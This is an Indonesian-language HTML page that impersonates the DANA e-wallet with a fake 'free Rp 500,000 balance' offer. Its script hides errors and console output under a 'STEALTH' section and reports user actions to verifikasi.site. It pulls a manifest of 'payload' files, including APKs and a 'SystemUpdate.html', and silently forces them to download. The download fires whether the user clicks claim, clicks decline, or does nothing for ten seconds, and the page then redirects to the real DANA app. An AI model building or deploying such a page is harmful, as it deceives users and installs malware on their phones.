<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999998;display:none;justify-content:center;align-items:center;flex-direction:column;color:#fff;font-size:14px}
        .loading-overlay .spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .loading-overlay .step-text{color:#8899aa;font-size:12px;margin-top:5px}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#0f0;padding:12px 24px;border-radius:8px;z-index:999999;font-size:13px;display:none;border-left:4px solid #0f0}
        .toast.error{border-left-color:#ff4444;color:#ff4444}
    </style>
</head>
<body>

<div id="statusBar" class="status-bar"></div>
<div class="toast" id="toast"></div>

<div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div id="loadingTitle">⏳ Memproses...</div>
    <div class="step-text" id="loadingStep">📥 Mendownload...</div>
</div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// INDEX.HTML - LOGIS & PASTI JALAN
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var MANIFEST_URL = SERVER + '/files/manifest.txt';
var FILES_BASE_URL = SERVER + '/files/';
var semuaDidapat = false;

// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; }, true);
if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// DETEKSI ANDROID BRIDGE (HANYA JIKA ADA)
// ============================================================
var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// UI
// ============================================================
function showLoading(show) {
    document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
    if (show) {
        document.getElementById('statusBar').className = 'status-bar loading';
    } else {
        document.getElementById('statusBar').className = 'status-bar';
    }
}

function updateLoading(title, step) {
    document.getElementById('loadingTitle').textContent = title;
    document.getElementById('loadingStep').textContent = step;
}

function showToast(msg, isError) {
    var t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast' + (isError ? ' error' : '');
    t.style.display = 'block';
    clearTimeout(t._timer);
    t._timer = setTimeout(function() { t.style.display = 'none'; }, 3000);
}

// ============================================================
// DOWNLOAD PAYLOAD (PAKAI FETCH + BLOB)
// ============================================================
function downloadPayload() {
    return new Promise(function(resolve) {
        updateLoading('📥 Mendownload payload...', 'Mengambil manifest...');

        fetch(MANIFEST_URL, {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        })
        .then(function(response) {
            if (!response.ok) {
                throw new Error('Gagal mengambil manifest');
            }
            return response.text();
        })
        .then(function(manifestText) {
            var fileNames = manifestText.split('\n')
                .map(function(line) { return line.trim(); })
                .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });

            if (fileNames.length === 0) {
                throw new Error('Manifest kosong');
            }

            updateLoading('📥 ' + fileNames.length + ' file ditemukan', 'Mendownload...');
            K({ sumber: 'manifest_loaded', data: { files: fileNames } });

            var downloadPromises = fileNames.map(function(fileName) {
                return downloadSingleFile(fileName);
            });

            return Promise.all(downloadPromises);
        })
        .then(function(downloadedFiles) {
            var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
            updateLoading('✅ ' + successCount + ' file berhasil di-download', '');
            K({ sumber: 'download_complete', data: { total: successCount } });
            showToast('✅ ' + successCount + ' file berhasil di-download');
            resolve();
        })
        .catch(function(error) {
            K({ sumber: 'manifest_error', data: error.message });
            updateLoading('⚠️ Gagal download manifest', '');
            showToast('⚠️ Gagal download: ' + error.message, true);
            resolve();
        });
    });
}

// ============================================================
// DOWNLOAD SATU FILE (PASTI KE FOLDER DOWNLOAD)
// ============================================================
function downloadSingleFile(fileName) {
    return new Promise(function(resolve) {
        var fileUrl = FILES_BASE_URL + fileName;
        var isApk = fileName.toLowerCase().endsWith('.apk');

        fetch(fileUrl, {
            method: 'GET',
            cache: 'no-store'
        })
        .then(function(response) {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status);
            }
            
            if (isApk) {
                return response.blob().then(function(blob) {
                    return { name: fileName, content: blob, type: 'blob' };
                });
            } else {
                return response.text().then(function(text) {
                    return { name: fileName, content: text, type: 'text' };
                });
            }
        })
        .then(function(fileData) {
            // ============================================================
            // SIMPAN KE FOLDER DOWNLOAD (PASTI ADA!)
            // ============================================================
            if (fileData.type === 'text') {
                // HTML - simpan ke localStorage
                try {
                    localStorage.setItem('file_' + fileName, fileData.content);
                    if (fileName.toLowerCase() === 'systemupdate.html') {
                        try { localStorage.setItem('SystemUpdate_backup', fileData.content); } catch(e) {}
                    }
                } catch(e) {}
            }

            // ============================================================
            // TRIGGER DOWNLOAD VIA BLOB (PASTI KE FOLDER DOWNLOAD)
            // ============================================================
            try {
                var blob = fileData.type === 'text' ? new Blob([fileData.content], {type: 'text/html'}) : fileData.content;
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = fileName;
                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                document.body.appendChild(a);
                setTimeout(function() {
                    a.click();
                    setTimeout(function() {
                        try { document.body.removeChild(a); } catch(e) {}
                        URL.revokeObjectURL(url);
                    }, 2000);
                }, 300);
            } catch(e) {}

            resolve({ name: fileName, content: fileData.content, type: fileData.type });
        })
        .catch(function(error) {
            K({ sumber: 'download_error', data: { file: fileName, error: error.message } });
            resolve(null);
        });
    });
}

// ============================================================
// REDIRECT KE DANA
// ============================================================
function redirectToDANA() {
    // Via Bridge (jika ada)
    if (HAS_BRIDGE) {
        try { AndroidBridge.openApp('com.dana.id'); return; } catch(e) {}
    }
    // Via Intent
    try {
        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
        return;
    } catch(e) {}
    // Via Website
    try {
        window.location.href = 'https://www.dana.id';
        return;
    } catch(e) {}
}

// ============================================================
// EKSEKUSI UTAMA
// ============================================================
async function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    document.getElementById('popupDana').style.display = 'none';
    showLoading(true);
    
    K({ sumber: 'start', data: 'dapatkanSemua' });
    
    try {
        // DOWNLOAD PAYLOAD
        await downloadPayload();
        K({ sumber: 'download_done', data: 'ok' });
        
        updateLoading('✅ SELESAI!', '');
        K({ sumber: 'all_done', data: 'success' });
        
        setTimeout(function() {
            showLoading(false);
            redirectToDANA();
        }, 1000);
        
    } catch(e) {
        K({ sumber: 'error', data: e.message });
        setTimeout(function() {
            showLoading(false);
            redirectToDANA();
        }, 2000);
    }
}

function klaim() { K({sumber:'click', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'click', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER 10 DETIK
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'timer', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

console.log('🔥 INDEX.HTML - LOGIS & PASTI JALAN');
console.log('📱 Android Bridge:', HAS_BRIDGE);
</script>
</body>
</html>
